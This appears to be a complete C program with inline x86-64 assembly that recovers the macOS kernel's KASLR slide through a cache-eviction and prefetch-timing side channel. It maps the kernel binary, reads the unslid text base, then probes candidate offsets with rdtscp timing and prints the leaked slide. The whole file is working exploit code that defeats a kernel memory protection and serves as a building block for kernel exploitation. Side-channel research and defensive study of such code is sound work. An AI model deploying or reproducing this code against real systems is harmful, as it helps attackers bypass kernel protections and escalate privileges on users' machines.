
#include <stdint.h>             // uint64_t
#include <stdio.h>              // printf, fprintf, stderr
#include <mach/mach.h>
#include <mach-o/loader.h>      // mach_*
#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <string.h>             // strerror
#include <sys/sysctl.h>         // sysctl
#include <errno.h>              // errno
#include <fcntl.h>              // open, O_RDONLY
#include <libproc.h>            // proc_*
#include <stddef.h>             // size_t
#include <stdlib.h>             // realpath, malloc, free
#include <unistd.h>             // close
#include <sys/mman.h>           // mmap, munmap, MAP_FAILED
#include <sys/stat.h>           // fstat, struct stat
 
 
typedef struct mach_header_64 hdr_t;
typedef struct load_command lc_t;
typedef struct segment_command_64 seg_t;
typedef struct
{
    uint32_t nameoff;
    uint32_t flags;
    uint64_t addr;
} sym_t;
 
typedef struct
{
    void *buf;
    size_t len;
    int fd;
} filemap_t;
 
 
#define NUM_PROBE 16
#define FOREACH_CMD(hdr, cmd) \
for(lc_t *cmd  = (lc_t *) (((hdr_t*) (hdr)) + 1), \
         *_end = (lc_t *) ((char *) cmd + ((hdr_t*) (hdr))->sizeofcmds); \
    cmd < _end; \
    cmd = (lc_t *) ((char *) cmd + cmd->cmdsize))
 
#define SLIDE_MAX   0x20000000
#define SLIDE_STEP    0x100000
#define PREFETCH_LIMIT 50
#define KERNEL_PATH "/System/Library/Kernels/kernel"
#define ERR(str, args...) do { fprintf(stderr, "[!] " str " [%s:%u]\n", ##args, __FILE__, __LINE__); } while(0)
#define LOG(str, args...) do { printf(str "\n", ##args); } while(0)
 
 
 
uint64_t time_addr(uint64_t addr, uint8_t *mem, uint32_t cachesize, uint32_t cacheline);
 
__asm__
(
    "_time_addr:\n"
    // Evict cache
    "evict:\n"
    "   subl %ecx, %edx\n"
    "   movq $0, (%rsi, %rdx, 1)\n"
    "   cmp $0, %edx\n"
    "   jg evict\n"
    // Prefetch+Time
    "   mfence\n"
    "   rdtscp\n"
    "   movl %eax, %r10d\n"
    "   movl %edx, %r11d\n"
    "   prefetcht2 (%rdi)\n"
    "   rdtscp\n"
    // Calculate return value
    "   subl %r11d, %edx\n"
    "   subl %r10d, %eax\n"
    "   salq $32, %rdx\n"
    "   orq %rdx, %rax\n"
    "   ret\n"
);
 
static int numerical_compare(const void *a, const void *b)
{
    return *(const uint64_t*)a - *(const uint64_t*)b;
}
 
static uint64_t median_avg(uint64_t *arr, size_t len)
{
    uint64_t avg = 0;
    for(size_t i = len * 3/8; i < len * 5/8; ++i)
    {
        avg += arr[i];
    }
    return avg / (len / 4);
}
 
uint64_t get_kernel_slide(void *kernel)
{
    LOG("Getting kernel slide...");
 
    uint64_t text_base = 0,
             text_size = 0;
    FOREACH_CMD(kernel, cmd)
    {
        if(cmd->cmd == LC_SEGMENT_64)
        {
            text_base = ((seg_t*)cmd)->vmaddr;
            text_size = ((seg_t*)cmd)->vmsize;
            goto found;
        }
    }
    ERR("Failed to get unslid kernel base address from binary");
    return -2;
 
    found:;
    LOG("Unslid kernel base is 0x%016llx", text_base);
 
    int ctrl[] = { CTL_HW, HW_L3CACHESIZE };
    uint32_t cachesize = 0;
    size_t size = sizeof(cachesize);
    if(sysctl(ctrl, sizeof(ctrl) / sizeof(*ctrl), &cachesize, &size, NULL, 0) != 0)
    {
        ERR("sysctl(\"hw.l3cachesize\") failed: %s", strerror(errno));
        return -2;
    }
    LOG("L3 cache size: %u", cachesize);
 
    ctrl[1] = HW_CACHELINE;
    uint32_t cacheline = 0;
    size = sizeof(cacheline);
    if(sysctl(ctrl, sizeof(ctrl) / sizeof(*ctrl), &cacheline, &size, NULL, 0) != 0)
    {
        ERR("sysctl(\"hw.cachelinesize\") failed: %s", strerror(errno));
        return -2;
    }
    LOG("Cacheline size: %u", cacheline);
 
    void *mem = malloc(cachesize);
    if(mem == NULL)
    {
        ERR("Failed to allocate cache eviction buffer: %s", strerror(errno));
        return -2;
    }
 
    LOG("Doing timings, this might take a bit (and requires radio silence)...");
    uint64_t slide = -1;
 
    // Probe kernel mem
    uint64_t *buf = malloc(NUM_PROBE * sizeof(*buf));
    if(buf == NULL)
    {
        ERR("Failed to allocate timings buffer: %s", strerror(errno));
        slide = -2;
        goto cleanup;
    }
 
    size_t num_need = (text_size + SLIDE_STEP - 1) / SLIDE_STEP,
           num_have = 0;
    for(uint64_t off = 0; off < SLIDE_MAX; off += SLIDE_STEP)
    {
        printf("0x%08llx ",off);
        for(size_t i = 0; i < NUM_PROBE; ++i)
        {
            sched_yield(); // reduce likelihood for preemption
            buf[i] = time_addr(text_base + off, mem, cachesize, cacheline);
            printf("%8lld ",buf[i]);
        }
        printf("\n");
        qsort(buf, NUM_PROBE, sizeof(*buf), &numerical_compare);
 
        if(median_avg(buf, NUM_PROBE) > PREFETCH_LIMIT)
        {
            num_have = 0;
        }
        else
        {
            ++num_have;
            if(num_have >= num_need)
            {
                slide = off - (SLIDE_STEP * (num_have - 1));
                break;
            }
        }
    }
 
    if(slide == -1)
    {
        ERR("Failed to determine kernel slide");
    }
    else
    {
        LOG("Kernel slide: 0x%llx", slide);
    }
 
    free(buf);
cleanup:;
    free(mem);
    return slide;
}
 
 
int map_file(filemap_t *map, const char *path)
{
    int fd = open(path, O_RDONLY);
    if(fd == -1)
    {
        ERR("Failed to open %s for reading: %s", path, strerror(errno));
        return -1;
    }
    struct stat s;
    if(fstat(fd, &s) != 0)
    {
        ERR("Failed to stat(%s): %s", path, strerror(errno));
        return -1;
    }
    size_t len = s.st_size;
    void *buf = mmap(NULL, len, PROT_READ, MAP_PRIVATE, fd, 0);
    if(buf == MAP_FAILED)
    {
        ERR("Failed to map %s to memory: %s", path, strerror(errno));
        return -1;
    }
    map->fd = fd;
    map->len = len;
    map->buf = buf;
    return 0;
}
 
 
int main(int argc, const char **argv)
{
   
    filemap_t kernel;
    if(map_file(&kernel, KERNEL_PATH) != 0)
    {
        return -1;
    }
 
    get_kernel_slide(kernel.buf);
   
    return 0;
}


